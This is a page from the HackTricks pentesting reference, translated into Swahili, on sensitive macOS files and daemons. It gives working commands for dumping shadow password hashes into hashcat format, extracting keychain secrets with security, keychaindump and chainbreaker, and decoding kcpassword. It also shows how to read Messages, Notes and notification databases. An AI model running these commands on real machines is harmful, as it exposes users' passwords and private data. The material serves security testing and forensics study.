# Maeneo Nyeti ya macOS & Daemons Muhimu

<details>

<summary><strong>Jifunze AWS hacking kutoka sifuri hadi shujaa na</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Mtaalam wa Timu Nyekundu ya AWS ya HackTricks)</strong></a><strong>!</strong></summary>

Njia nyingine za kusaidia HackTricks:

* Ikiwa unataka kuona **kampuni yako ikitangazwa kwenye HackTricks** au **kupakua HackTricks kwa PDF** Angalia [**MIPANGO YA KUJIUNGA**](https://github.com/sponsors/carlospolop)!
* Pata [**bidhaa rasmi za PEASS & HackTricks**](https://peass.creator-spring.com)
* Gundua [**Familia ya PEASS**](https://opensea.io/collection/the-peass-family), mkusanyiko wetu wa [**NFTs**](https://opensea.io/collection/the-peass-family) za kipekee
* **Jiunge na** 💬 [**Kikundi cha Discord**](https://discord.gg/hRep4RUj7f) au kikundi cha [**telegram**](https://t.me/peass) au **tufuate** kwenye **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Shiriki mbinu zako za kuhack kwa kuwasilisha PRs kwa** [**HackTricks**](https://github.com/carlospolop/hacktricks) na [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repos za github.

</details>

## Nywila

### Nywila za Kivuli

Nywila za Kivuli hifadhiwa pamoja na usanidi wa mtumiaji katika plists zilizoko katika **`/var/db/dslocal/nodes/Default/users/`**.\
Oneliner ifuatayo inaweza kutumika kudump **habari zote kuhusu watumiaji** (ikiwa ni pamoja na habari za hash):

{% code overflow="wrap" %}
```bash
for l in /var/db/dslocal/nodes/Default/users/*; do if [ -r "$l" ];then echo "$l"; defaults read "$l"; fi; done
```
{% endcode %}

[**Scripts kama hii moja**](https://gist.github.com/teddziuba/3ff08bdda120d1f7822f3baf52e606c2) au [**hii**](https://github.com/octomagon/davegrohl.git) inaweza kutumika kubadilisha hash kuwa **muundo wa hashcat**.

Mstari mmoja mbadala ambao utadump creds za akaunti zote zisizo za huduma kwenye muundo wa hashcat `-m 7100` (macOS PBKDF2-SHA512):

{% code overflow="wrap" %}
```bash
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```
{% endcode %}

### Kudondoa Keychain

Tafadhali kumbuka kwamba unapotumia binary ya usalama kudondoa manenosiri yaliyofichuliwa, maombi kadhaa yatakualika ruhusa ya kufanya operesheni hii.
```bash
#security
secuirty dump-trust-settings [-s] [-d] #List certificates
security list-keychains #List keychain dbs
security list-smartcards #List smartcards
security dump-keychain | grep -A 5 "keychain" | grep -v "version" #List keychains entries
security dump-keychain -d #Dump all the info, included secrets (the user will be asked for his password, even if root)
```
### [Keychaindump](https://github.com/juuso/keychaindump)

{% hint style="danger" %}
Kulingana na maoni haya [juuso/keychaindump#10 (comment)](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760) inaonekana kama zana hizi hazifanyi kazi tena katika Big Sur.
{% endhint %}

### Muhtasari wa Keychaindump

Zana inayoitwa **keychaindump** imeendelezwa ili kutoa nywila kutoka kwa keychains ya macOS, lakini inakabiliwa na vizuizi kwenye toleo jipya la macOS kama Big Sur, kama ilivyoelezwa katika [mjadala](https://github.com/juuso/keychaindump/issues/10#issuecomment-751218760). Matumizi ya **keychaindump** yanahitaji mshambuliaji kupata ufikiaji na kuinua mamlaka hadi **root**. Zana hii inatumia ukweli kwamba keychain inafunguliwa kiotomatiki baada ya mtumiaji kuingia kwa urahisi, kuruhusu programu kupata bila kuhitaji nywila ya mtumiaji mara kwa mara. Walakini, ikiwa mtumiaji anachagua kufunga keychain yao baada ya kila matumizi, **keychaindump** inakuwa haifanyi kazi.

**Keychaindump** inafanya kazi kwa kulenga mchakato maalum unaoitwa **securityd**, ulioelezwa na Apple kama daemon kwa idhini na shughuli za kriptografia, muhimu kwa kupata keychain. Mchakato wa uchimbaji unahusisha kutambua **Master Key** inayotokana na nywila ya kuingia ya mtumiaji. Kufuatilia **Master Key**, **keychaindump** inachunguza kumbukumbu ya heap ya **securityd** kwa kutumia amri ya `vmmap`, kutafuta funguo za uwezekano ndani ya maeneo yaliyofungwa kama `MALLOC_TINY`. Amri ifuatayo hutumiwa kuangalia maeneo haya ya kumbukumbu:
```bash
sudo vmmap <securityd PID> | grep MALLOC_TINY
```
Baada ya kutambua ufunguo wa mkuu unaowezekana, **keychaindump** inatafuta kupitia mafundo kwa mfano maalum (`0x0000000000000018`) ambao unaashiria mgombea kwa ufunguo wa mkuu. Hatua zaidi, ikiwa ni pamoja na kufuta ujazo, zinahitajika kutumia ufunguo huu, kama ilivyoelezwa katika msimbo wa chanzo wa **keychaindump**. Wachambuzi wanaojikita katika eneo hili wanapaswa kuzingatia kuwa data muhimu ya kufuta ufunguo wa mafungu imehifadhiwa ndani ya kumbukumbu ya mchakato wa **securityd**. Amri ya mfano ya kukimbia **keychaindump** ni:
```bash
sudo ./keychaindump
```
### chainbreaker

[**Chainbreaker**](https://github.com/n0fate/chainbreaker) inaweza kutumika kuchimba aina zifuatazo za habari kutoka kwa keychain ya OSX kwa njia inayofaa kwa uchunguzi wa kisayansi:

* Hashed Keychain password, inayofaa kwa kuvunja kwa [hashcat](https://hashcat.net/hashcat/) au [John the Ripper](https://www.openwall.com/john/)
* Manenosiri ya Mtandao
* Manenosiri ya Kijumla
* Funguo Binafsi
* Funguo za Umma
* Vyeti vya X509
* Taarifa Salama
* Manenosiri ya Appleshare

Ukipewa nenosiri la kufungua keychain, funguo kuu iliyopatikana kwa kutumia [volafox](https://github.com/n0fate/volafox) au [volatility](https://github.com/volatilityfoundation/volatility), au faili ya kufungua kama SystemKey, Chainbreaker pia itatoa manenosiri ya maandishi wazi.

Bila moja ya njia hizi za kufungua Keychain, Chainbreaker itaonyesha habari zingine zilizopo. 

#### **Pakua funguo za keychain**
```bash
#Dump all keys of the keychain (without the passwords)
python2.7 chainbreaker.py --dump-all /Library/Keychains/System.keychain
```
#### **Dumpisha funguo za keychain (pamoja na nywila) kwa kutumia SystemKey**
```bash
# First, get the keychain decryption key
# To get this decryption key you need to be root and SIP must be disabled
hexdump -s 8 -n 24 -e '1/1 "%.2x"' /var/db/SystemKey && echo
## Use the previous key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Tupa funguo za keychain (pamoja na nywila) kuvunja hash**
```bash
# Get the keychain hash
python2.7 chainbreaker.py --dump-keychain-password-hash /Library/Keychains/System.keychain
# Crack it with hashcat
hashcat.exe -m 23100 --keep-guessing hashes.txt dictionary.txt
# Use the key to decrypt the passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dumpisha funguo za keychain (pamoja na nywila) kwa kudondosha kumbukumbu**

[Fuata hatua hizi](../#dumping-memory-with-osxpmem) kutekeleza **kudondosha kumbukumbu**
```bash
#Use volafox (https://github.com/n0fate/volafox) to extract possible keychain passwords
# Unformtunately volafox isn't working with the latest versions of MacOS
python vol.py -i ~/Desktop/show/macosxml.mem -o keychaindump

#Try to extract the passwords using the extracted keychain passwords
python2.7 chainbreaker.py --dump-all --key 0293847570022761234562947e0bcd5bc04d196ad2345697 /Library/Keychains/System.keychain
```
#### **Dump keychain keys (with passwords) using users password**

Ikiwa unajua nenosiri la mtumiaji unaweza kulitumia **kudondosha na kufichua keychains zinazomilikiwa na mtumiaji**.
```bash
#Prompt to ask for the password
python2.7 chainbreaker.py --dump-all --password-prompt /Users/<username>/Library/Keychains/login.keychain-db
```
### kcpassword

Faili la **kcpassword** ni faili inayoshikilia **nywila ya kuingia ya mtumiaji**, lakini tu ikiwa mmiliki wa mfumo amewezesha **uingiaji wa moja kwa moja**. Kwa hivyo, mtumiaji ataingia kiotomatiki bila kuombwa nywila (ambayo sio salama sana).

Nywila imehifadhiwa kwenye faili **`/etc/kcpassword`** iliyoxored na ufunguo **`0x7D 0x89 0x52 0x23 0xD2 0xBC 0xDD 0xEA 0xA3 0xB9 0x1F`**. Ikiwa nywila ya mtumiaji ni refu kuliko ufunguo, ufunguo utatumika tena.\
Hii inafanya kuwa rahisi kupata nywila, kwa mfano kutumia hati kama [**hii**](https://gist.github.com/opshope/32f65875d45215c3677d). 

## Taarifa Muhimu katika Databases

### Ujumbe
```bash
sqlite3 $HOME/Library/Messages/chat.db .tables
sqlite3 $HOME/Library/Messages/chat.db 'select * from message'
sqlite3 $HOME/Library/Messages/chat.db 'select * from attachment'
sqlite3 $HOME/Library/Messages/chat.db 'select * from deleted_messages'
sqlite3 $HOME/Suggestions/snippets.db 'select * from emailSnippets'
```
### Taarifa

Unaweza kupata data za Taarifa katika `$(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/`

Maelezo mengi ya kuvutia yatakuwepo katika **blob**. Hivyo utahitaji **kutoa** yaliyomo hayo na **kubadilisha** kuwa **soma** **na** **ueleweke** au tumia **`strings`**. Ili kupata unaweza kufanya hivi:

{% code overflow="wrap" %}
```bash
cd $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/
strings $(getconf DARWIN_USER_DIR)/com.apple.notificationcenter/db2/db | grep -i -A4 slack
```
{% endcode %}

### Maelezo

Watumiaji **maelezo** wanaweza kupatikana katika `~/Library/Group Containers/group.com.apple.notes/NoteStore.sqlite`

{% code overflow="wrap" %}
```bash
sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite .tables

#To dump it in a readable format:
for i in $(sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select Z_PK from ZICNOTEDATA;"); do sqlite3 ~/Library/Group\ Containers/group.com.apple.notes/NoteStore.sqlite "select writefile('body1.gz.z', ZDATA) from ZICNOTEDATA where Z_PK = '$i';"; zcat body1.gz.Z ; done
```
{% endcode %}

## Mapendeleo

Katika programu za macOS mapendeleo hupatikana katika **`$HOME/Library/Preferences`** na katika iOS zinapatikana katika `/var/mobile/Containers/Data/Application/<UUID>/Library/Preferences`.&#x20;

Katika macOS zana ya cli **`defaults`** inaweza kutumika kubadilisha faili za Mapendeleo.

**`/usr/sbin/cfprefsd`** inadai huduma za XPC `com.apple.cfprefsd.daemon` na `com.apple.cfprefsd.agent` na inaweza kuitwa kutekeleza vitendo kama vile kubadilisha mapendeleo.

## Taarifa za Mfumo

### Taarifa za Darwin

Mnara wa kuu wa taarifa ni **`/usr/sbin/notifyd`**. Ili kupokea taarifa, wateja lazima wajiandikishe kupitia bandari ya Mach `com.apple.system.notification_center` (angalia kwa `sudo lsmp -p <pid notifyd>`). Mnara huo unaweza kubadilishwa kwa faili `/etc/notify.conf`.

Majina yanayotumiwa kwa taarifa ni maelezo ya kipekee ya DNS ya kurudi na wakati taarifa inatumwa kwa mojawapo yao, wateja ambao wameonyesha wanaweza kuisimamia watapokea.

Inawezekana kudondosha hali ya sasa (na kuona majina yote) kwa kutuma ishara SIGUSR2 kwa mchakato wa notifyd na kusoma faili iliyozalishwa: `/var/run/notifyd_<pid>.status`:
```bash
ps -ef | grep -i notifyd
0   376     1   0 15Mar24 ??        27:40.97 /usr/sbin/notifyd

sudo kill -USR2 376

cat /var/run/notifyd_376.status
[...]
pid: 94379   memory 5   plain 0   port 0   file 0   signal 0   event 0   common 10
memory: com.apple.system.timezone
common: com.apple.analyticsd.running
common: com.apple.CFPreferences._domainsChangedExternally
common: com.apple.security.octagon.joined-with-bottle
[...]
```
### Kituo cha Taarifa Kilichosambazwa

**Kituo cha Taarifa Kilichosambazwa** ambacho binary yake kuu ni **`/usr/sbin/distnoted`**, ni njia nyingine ya kutuma taarifa. Inafunua huduma za XPC na inafanya ukaguzi fulani kujaribu kuthibitisha wateja.

### Taarifa za Kusukuma za Apple (APN)

Katika kesi hii, programu zinaweza kujiandikisha kwa **mada**. Mteja atazalisha ishara kwa kuwasiliana na seva za Apple kupitia **`apsd`**.\
Kisha, watoa huduma, pia watakuwa wamezalisha ishara na wataweza kuunganisha na seva za Apple kutuma ujumbe kwa wateja. Ujumbe huu utapokelewa kwa upande wa kienyeji na **`apsd`** ambayo itapeleka taarifa kwa programu inayosubiri.

Mapendeleo yako yako katika `/Library/Preferences/com.apple.apsd.plist`.

Kuna database ya kienyeji ya ujumbe iliyoko macOS katika `/Library/Application\ Support/ApplePushService/aps.db` na katika iOS katika `/var/mobile/Library/ApplePushService`. Ina meza 3: `incoming_messages`, `outgoing_messages` na `channel`.
```bash
sudo sqlite3 /Library/Application\ Support/ApplePushService/aps.db
```
Pia niwezekana kupata habari kuhusu daemon na mawasiliano kwa kutumia:
```bash
/System/Library/PrivateFrameworks/ApplePushService.framework/apsctl status
```
## Taarifa kwa Mtumiaji

Hizi ni taarifa ambazo mtumiaji anapaswa kuona kwenye skrini:

- **`CFUserNotification`**: API hii hutoa njia ya kuonyesha kwenye skrini pop-up na ujumbe.
- **Ubao wa Matangazo**: Hii inaonyesha kwenye iOS bango ambalo linatoweka na kuhifadhiwa kwenye Kituo cha Taarifa.
- **`NSUserNotificationCenter`**: Hii ni ubao wa matangazo wa iOS kwenye MacOS. Hifadhidata ya taarifa ipo katika `/var/folders/<user temp>/0/com.apple.notificationcenter/db2/db`
